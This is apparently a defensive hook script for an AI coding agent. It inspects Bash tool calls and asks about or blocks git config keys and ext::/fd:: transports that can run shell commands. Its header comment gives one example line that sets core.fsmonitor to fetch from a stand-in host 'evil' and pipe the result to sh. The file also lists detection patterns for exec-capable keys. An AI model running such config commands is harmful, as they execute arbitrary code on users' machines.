#!/usr/bin/env bash
# Claude Supercharger — Git Config Exec Guard
# Event: PreToolUse | Matcher: Bash
#
# `git config` (or `git -c KEY=VAL`) can set an EXEC-CAPABLE config key that turns
# the next ordinary git command into arbitrary shell execution — core.fsmonitor,
# core.sshCommand, credential.helper, core.pager/editor, alias.x '!sh', filter.*
# clean/smudge, diff.*.command, difftool/mergetool.*.cmd, sequence.editor, and a
# PERSISTENT core.hooksPath redirect. `git config core.fsmonitor '!curl evil|sh'`
# fires on the next `git status`. git-safety blocks only the INLINE `-c core.hooksPath=`
# verification-bypass form; the whole persistent-config exec family was open
# (CVE-2026-55607 fsmonitor + the git-credential-helper CVE cluster). ASKS (these
# keys are frequently legit: credential.helper=store, core.pager=less, benign
# aliases) — DENYs only the always-malicious subset (fsmonitor, command-valued
# sshCommand). Asks once per key per session. Advisory + fail-open; disable with
# SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0.
#
# Also DENYs the `ext::`/`fd::` remote-helper TRANSPORT (git runs a shell command at
# clone/fetch/remote time — no config key, no hooks) and `protocol.ext.allow=always`
# which re-enables it. Never legitimate in agent-driven work; near-zero FP.
# (simple-git CVE-2026-28292 CVSS 9.8, n8n CVE-2026-25053.)
# Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0
set -uo pipefail
HOOKS_DIR="${BASH_SOURCE[0]%/*}"
# shellcheck source=hooks/lib-suppress.sh
. "$HOOKS_DIR/lib-suppress.sh" 2>/dev/null || true

[ "${SUPERCHARGER_GIT_CONFIG_EXEC_GUARD:-1}" = "0" ] && exit 0

# v2.26.35: fork-free stdin read. `$(cat)` forks /bin/cat in EVERY hook —
# ~1.8ms each, and 18 blocking hooks fire per Bash tool call. The trailing
# strip reproduces $(cat)'s newline handling so this is byte-identical.
. "${BASH_SOURCE[0]%/*}/lib-stdin.sh"
. "${BASH_SOURCE[0]%/*}/lib-deny.sh"; sc_read_input _INPUT

# Fast-path: needs git AND (a config-setting / transport-helper form, OR git aimed
# away from the project's own repo). Superset.
case "$_INPUT" in *git*) : ;; *) exit 0 ;; esac
_GCE_SET=0
case "$_INPUT" in *config*|*"-c "*|*"-c\\\""*|*"ext::"*|*"fd::"*|*"protocol."*) _GCE_SET=1 ;; esac

# GitSpawn: a repo OUTSIDE the project (or nested in it with its own .git) can ship
# a .git/config whose core.fsmonitor / hooksPath / sshCommand / pager / filter driver
# runs on an ordinary `git status`. Lives here rather than in a new hook because the
# python below is already this hook's one fork: a separate hook would pay bash
# startup on EVERY Bash call ([[perf-fork-budget]]) to reach the same decision.
# The common cases are decided here with no fork: git run in the project root, and
# the agent's habitual `cd /abs/project/dir && git ...`. Anything this cannot prove
# lands in the project's own repo (a relative/~/$ path, -C, --git-dir, GIT_DIR,
# pushd, a dir outside the root or the root spelled differently) goes to python.
_GCE_AWAY=0
_gce_pd="${CLAUDE_PROJECT_DIR:-}"; _gce_pd="${_gce_pd%/}"
# 0 when $1 is the project root, or under it with no nested .git on the way up.
_gce_in() {
  local d="${1%/}"
  [ -n "$d" ] && [ -n "$_gce_pd" ] || return 1
  [ "$d" = "$_gce_pd" ] && return 0
  case "$d/" in "$_gce_pd"/*) ;; *) return 1 ;; esac
  while [ "$d" != "$_gce_pd" ]; do
    # a symlink can point into another repo; a .git here is a nested one
    [ -L "$d" ] || [ -e "$d/.git" ] && return 1
    d="${d%/*}"
  done
  return 0
}
if [ -z "$_gce_pd" ]; then
  # no project dir: git in the cwd IS the project; only a redirect can leave it
  case "$_INPUT" in *"-C"*|*--git-dir*|*GIT_DIR*|*"cd "*|*pushd*) _GCE_AWAY=1 ;; esac
else
  . "${BASH_SOURCE[0]%/*}/lib-json-fast.sh"
  _json_get _GCE_CWD cwd "$_INPUT" '.cwd // .workspace.current_dir // empty'
  _gce_in "$_GCE_CWD" || _GCE_AWAY=1
  if [ "$_GCE_AWAY" = 0 ]; then
    case "$_INPUT" in
      *"-C"*|*--git-dir*|*GIT_DIR*|*"cd "*|*pushd*)
        # nested key: _json_get's top-level check would always fall to jq
        if _json_fast_str command "$_INPUT"; then _GCE_CMD="$_JSON_FAST_VAL"
        else _GCE_CMD=$(printf '%s\n' "$_INPUT" | jq -r '.tool_input.command // .tool_input.script // empty' 2>/dev/null || true); fi
        case "$_GCE_CMD" in
          *-C*|*--git-dir*|*GIT_DIR*|*pushd*|*'~'*|*'$'*|*'`'*|*..*|*\\*|*$'\n'*) _GCE_AWAY=1 ;;
          *)
            _gce_rest="$_GCE_CMD"; _gce_here="${_GCE_CWD%/}"
            _gce_re='(^|[;&|(])[[:space:]]*cd[[:space:]]+([^[:space:];&|)]+)'
            while [[ $_gce_rest =~ $_gce_re ]]; do
              _gce_a="${BASH_REMATCH[2]}"
              # a quote may hide a space, `cd -` an unknown dir -> python
              case "$_gce_a" in \"*|\'*|-*) _GCE_AWAY=1; break ;; /*) _gce_here="$_gce_a" ;; *) _gce_here="$_gce_here/$_gce_a" ;; esac
              _gce_in "$_gce_here" || { _GCE_AWAY=1; break; }
              _gce_rest="${_gce_rest#*"${BASH_REMATCH[0]}"}"
            done ;;
        esac ;;
    esac
  fi
fi
[ "$_GCE_SET" = 0 ] && [ "$_GCE_AWAY" = 0 ] && exit 0

check_hook_disabled "git-config-exec-guard" 2>/dev/null && exit 0
hook_profile_skip "git-config-exec-guard" 2>/dev/null && exit 0

CMD=$(printf '%s\n' "$_INPUT" | jq -r '.tool_input.command // .tool_input.script // empty' 2>/dev/null || true)
if [ -z "$CMD" ]; then
  CMD=$(printf '%s\n' "$_INPUT" | python3 -c "import sys,json;ti=json.load(sys.stdin).get('tool_input',{});print(ti.get('command') or ti.get('script') or '')" 2>/dev/null || echo "")
fi
[ -z "$CMD" ] && exit 0

# Classify in python (regex-heavy → temp-file redirect, not $(python <<EOF) which
# bash 3.2's command-sub parser mis-scans on paren/quote-dense bodies).
_GCE_OUT=$(mktemp 2>/dev/null) || _GCE_OUT="${TMPDIR:-/tmp}/gce.$$"
CMD_IN="$CMD" GCE_AWAY="$_GCE_AWAY" HOOK_INPUT="$_INPUT" HOOKS_DIR="$HOOKS_DIR" python3 -S > "$_GCE_OUT" 2>/dev/null <<'PYEOF'
import os, re, sys

cmd = os.environ.get("CMD_IN", "")

# A value that is SHELL-COMMAND-shaped (vs a plain program name / keyword).
CMD_SHAPE = re.compile(
    r'(^\s*!|\$\(|`|;|\||&&|\bsh\s+-c\b|\bbash\s+-c\b|\bzsh\s+-c\b|\bnode\s+-e\b|'
    r'\bpython3?\s+-c\b|\bperl\s+-e\b|\bruby\s+-e\b|/\S+\.(?:sh|py|rb|pl|js|ps1))',
    re.I)

def keyclass(key, val):
    """Return (verdict, label) or None. verdict in {DENY, ASK}."""
    k = key.lower()
    cmdshaped = bool(CMD_SHAPE.search(val))
    # Always an executable command — no benign form.
    if k == "core.fsmonitor":
        return ("DENY", "core.fsmonitor (runs on every git op)")
    if re.match(r'(filter\.[^.]+\.(clean|smudge)|diff\.[^.]+\.command|'
                r'(difftool|mergetool)\.[^.]+\.cmd)$', k):
        return ("ASK", key)
    # Persistent hooks redirect = verification/attack-hook bypass.
    if k == "core.hookspath":
        return ("ASK", "core.hooksPath (redirects git hooks)")
    # sshCommand: command-shaped value is an exec gadget → DENY.
    if k == "core.sshcommand":
        return (("DENY" if cmdshaped else None), "core.sshCommand") if cmdshaped else None
    # Aliases exec a shell only when '!'-prefixed.
    if k.startswith("alias."):
        return ("ASK", key) if val.lstrip().startswith("!") else None
    # Sometimes-legit keys: flag only when the value is command-shaped.
    if k in ("core.pager", "core.editor", "credential.helper", "sequence.editor",
             "core.askpass", "diff.external", "gpg.program", "uploadpack", "receivepack"):
        return ("ASK", key) if cmdshaped else None
    return None

def emit(v):
    if not v:
        return
    verdict, label = v
    print("%s|%s" % (verdict, label))
    raise SystemExit

# Transport helpers: `ext::`/`fd::` run a shell command at clone/fetch/remote time.
# Match only when the token STARTS a URL argument (preceded by start/space/quote/=),
# so paths like `.../ext::x` or `context::y` don't false-fire. Gated on a git cmd.
if re.search(r'\bgit\b', cmd):
    if re.search(r'''(?:^|[\s"'=])(?:ext|fd)::''', cmd):
        emit(("DENY", "ext::/fd:: transport (runs a shell command at clone/fetch)"))
    if re.search(r'protocol\.(?:ext|file)\.allow\s*=\s*always', cmd, re.I):
        emit(("DENY", "protocol.*.allow=always (re-enables the ext:: transport)"))

# Form 1: git config [--flags] <key> <value...>   (value runs to end / ; / && / |)
for m in re.finditer(r'git\s+config\s+((?:--\S+\s+)*)([\w][\w.-]*)\s+(.+)', cmd):
    key = m.group(2)
    rest = m.group(3)
    # value = up to an unquoted command separator; strip surrounding quotes.
    val = re.split(r'(?<!\\)[;&|]', rest, 1)[0].strip()
    if (val.startswith('"') and val.endswith('"')) or (val.startswith("'") and val.endswith("'")):
        val = val[1:-1]
    emit(keyclass(key, val))

# Form 2: git -c <key>=<value>
for m in re.finditer(r'git\s+(?:[^|;&]*\s)?-c\s+([\w][\w.-]*)=(\S+)', cmd):
    emit(keyclass(m.group(1), m.group(2)))

# --- GitSpawn: which repo does each git invocation land in? If it is not the
# project's own (by common git dir, so a linked worktree of the project counts as
# the project), read that repo's config -- with `git config --file`, never by
# running git there, which is exactly what would fire core.fsmonitor.
if os.environ.get("GCE_AWAY") != "1":
    raise SystemExit

def _msys(x):
    if os.name != "nt" or not x:
        return x
    m = re.match(r"^/([A-Za-z])(/|$)", x)
    return (m.group(1).upper() + ":\\" + x[3:].replace("/", "\\")) if m else x

sys.path.insert(0, _msys(os.environ.get("HOOKS_DIR", "")))
try:
    import lib_config_checks as cc
except Exception:
    print("NOLIB|lib_config_checks.py")  # cannot tell: say so, not "clean"
    raise SystemExit
import json, shlex
try:
    payload = json.loads(os.environ.get("HOOK_INPUT", ""))
except Exception:
    payload = {}
home = _msys(os.environ.get('HOME') or os.path.expanduser('~'))
here = os.path.realpath(_msys(payload.get("cwd") or (payload.get("workspace") or {}).get("current_dir") or os.getcwd()))

def res(p, base):
    p = os.path.expandvars(p)
    if p == "~" or p.startswith("~/"):
        p = home + p[1:]
    p = _msys(p)
    return os.path.realpath(p if os.path.isabs(p) else os.path.join(base, p))

def find_repo(start):
    d = start
    while True:
        gd, common = cc.git_dirs(os.path.join(d, ".git"))
        if gd:
            return gd, common, d
        nd = os.path.dirname(d)
        if nd == d:
            return None
        d = nd

proj = find_repo(os.path.realpath(_msys(os.environ.get("CLAUDE_PROJECT_DIR") or "") or here))
proj_common = str(proj[1]) if proj else None

try:
    lx = shlex.shlex(cmd.replace("\n", ";"), posix=True, punctuation_chars=True)
    lx.whitespace_split = True
    toks = list(lx)
except ValueError:
    toks = cmd.split()
segs, cur = [], []
for t in toks:
    if t and not t.strip("();<>|&"):
        if cur:
            segs.append(cur)
        cur = []
    else:
        cur.append(t)
if cur:
    segs.append(cur)

ASSIGN = re.compile(r"^[A-Za-z_]\w*=")
for seg in segs:
    i, envd = 0, {}
    while i < len(seg):
        if ASSIGN.match(seg[i]):
            k, _, v = seg[i].partition("="); envd[k] = v; i += 1
        elif seg[i] in ("env", "command", "exec", "time", "nohup", "sudo"):
            i += 1
        else:
            break
    if i >= len(seg):
        continue
    w, rest = seg[i], seg[i + 1:]
    if w in ("cd", "pushd"):
        arg = next((a for a in rest if not a.startswith("-")), None)
        if arg is None:
            here = os.path.realpath(home)
        elif arg != "-":
            here = res(arg, here)
        continue
    if os.path.basename(w) not in ("git", "git.exe"):
        continue
    start, gdir, j = here, envd.get("GIT_DIR"), 0
    while j < len(rest):
        a = rest[j]
        if a == "-C" and j + 1 < len(rest):
            start = res(rest[j + 1], start); j += 2
        elif a.startswith("--git-dir="):
            gdir = a.split("=", 1)[1]; j += 1
        elif a == "--git-dir" and j + 1 < len(rest):
            gdir = rest[j + 1]; j += 2
        elif a in ("-c", "--work-tree", "--namespace", "--config-env") and j + 1 < len(rest):
            j += 2
        elif a.startswith("-"):
            j += 1
        else:
            break
    if gdir:
        gd, common = cc.git_dirs(res(gdir, start))
        repo = (gd, common, str(gd.parent) if gd and gd.name == ".git" else str(gd)) if gd else None
    else:
        repo = find_repo(start)
    if not repo or str(repo[1]) == proj_common:
        continue
    keys = sorted({k for k, _, _ in cc.git_config_hits(cc.git_config_files(repo[0], repo[1]))})
    if keys:
        print("FOREIGN|%s|%s" % (repo[2], ", ".join(keys)))
        raise SystemExit
PYEOF
_RESULT=$(cat "$_GCE_OUT" 2>/dev/null); rm -f "$_GCE_OUT" 2>/dev/null
[ -z "$_RESULT" ] && exit 0

_VERDICT="${_RESULT%%|*}"
_LABEL="${_RESULT#*|}"

# Ask/deny once per key per session.
SID=$(printf '%s\n' "$_INPUT" | jq -r '.session_id // empty' 2>/dev/null || true); [ -z "$SID" ] && SID="${CLAUDE_CODE_SESSION_ID:-default}"
_SEEN="${SUPERCHARGER_STATE:-$HOME/.claude/supercharger}/scope/.gitcfgexec-seen-${SID}"
if [ -f "$_SEEN" ] && grep -qxF "$_VERDICT:$_LABEL" "$_SEEN" 2>/dev/null; then
  exit 0
fi
mkdir -p "$(dirname "$_SEEN")" 2>/dev/null || true
echo "$_VERDICT:$_LABEL" >> "$_SEEN" 2>/dev/null || true

if [ "$_VERDICT" = "FOREIGN" ]; then
  _GCE_REPO="${_LABEL%%|*}"; _GCE_KEYS="${_LABEL#*|}"
  sc_decision ask "This runs git in ${_GCE_REPO}, a repository that is not this project's, and its .git/config sets ${_GCE_KEYS}. Git runs those as commands on ordinary operations (status, diff, log, fetch), so this would execute whatever that repo shipped (GitSpawn class). Read the values first without running git there: git config --file '${_GCE_REPO}/.git/config' --list. (Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0)"
  echo "[Supercharger] git-config-exec-guard: ASK git in foreign repo ${_GCE_REPO} (${_GCE_KEYS})" >&2
  exit 0
fi
if [ "$_VERDICT" = "NOLIB" ]; then
  sc_decision ask "Supercharger could not load ${_LABEL}, so it cannot check whether the repository this git command targets (outside the project root) carries an exec-capable .git/config (core.fsmonitor, hooksPath, sshCommand, pager, filter). Reinstall Supercharger, or confirm you trust that repository. (Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0)"
  exit 0
fi

if [ "$_VERDICT" = "DENY" ]; then
  _MSG="Blocked: ${_LABEL} — git would run a shell command at a git operation (arbitrary code execution; CVE-2026-55607 fsmonitor / CVE-2026-28292 ext:: transport class). If you truly need this, run it yourself in the terminal. (Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0)"
  sc_decision deny "$_MSG"
  echo "[Supercharger] git-config-exec-guard: DENY exec-capable git (${_LABEL})" >&2
  exit 2
fi

_MSG="This sets the git config key ${_LABEL}, which git can execute as a command on a later git operation — a common RCE/persistence vector. Confirm it's an intended, trusted value (e.g. credential.helper=store, core.pager=less are fine; a '!'-shell or script path is the risk). (Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0)"
sc_decision ask "$_MSG"
echo "[Supercharger] git-config-exec-guard: ASK exec-capable git config (${_LABEL})" >&2
exit 0
